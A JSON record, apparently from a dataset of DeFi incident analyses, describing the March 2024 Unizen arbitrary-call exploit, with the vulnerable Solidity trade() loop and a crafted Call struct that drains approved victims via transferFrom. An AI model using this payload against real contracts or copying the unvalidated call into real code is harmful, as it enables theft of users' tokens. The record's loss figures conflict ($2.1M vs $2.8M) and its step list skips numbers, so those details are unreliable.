@@ -1,0 +1,28 @@
+{
+ "id": "2024__2024-03-08_Unizen_ArbitraryCall_ETH",
+ "source_file": "2024/2024-03-08_Unizen_ArbitraryCall_ETH.md",
+ "title": "Unizen — Unvalidated External Call Vulnerability Analysis",
+ "date": "2024-03-08",
+ "protocol": "Unizen",
+ "chain": "Ethereum",
+ "loss_raw": "~$2,100,000 (per SlowMist, Halborn, CoinTelegraph)",
+ "loss_usd": 2100000.0,
+ "root_cause": "Unvalidated calldata external call in `trade()` function used to steal user tokens",
+ "attack_tx": null,
+ "vulnerable_contract": "Unizen Trade Aggregator Proxy",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [],
+ "code_after": [],
+ "steps": [
+  "[allowance: victim → aggregator]",
+  "① Attacker → calls Unizen.trade()",
+  "③ calls[0] = { target: VRA token, data: transferFrom(victim→attacker) }",
+  "⑥ Repeated across multiple victims / multiple tokens → $2.8M loss"
+ ],
+ "other_code": [
+  "struct Info {\n    address to;          // Recipient (attacker specifies their own address)\n    address token;       // Input token\n    uint256 amount;\n    string uuid;\n    uint256 apiId;\n    uint256 userPSFee;\n    // ...\n}\n\nstruct Call {\n    address target;      // External call target address (no validation!)\n    uint256 amount;\n    bytes data;          // External call calldata (no validation!)\n}\n\n// selector: 0x1ef29a02\nfunction trade(Info memory info, Call[] memory calls) external payable {\n    // ...\n    for (uint i = 0; i < calls.length; i++) {\n        // Critical flaw: calls[i].target and calls[i].data are not validated\n        (bool success, ) = calls[i].target.call{value: calls[i].amount}(calls[i].data);\n        require(success, \"call failed\");\n    }\n    // ...\n}",
+  "// Malicious Call struct injected by the attacker:\nCall memory maliciousCall = Call({\n    target: address(VRA_TOKEN),          // ERC-20 token address\n    amount: 0,\n    data: abi.encodeWithSignature(\n        \"transferFrom(address,address,uint256)\",\n        tokenHolder,             // Victim (user who approved Unizen)\n        address(TradeAggregator), // Unizen contract (acts as msg.sender)\n        VRA.balanceOf(tokenHolder) // Victim's entire balance\n    )\n});"
+ ]
+}
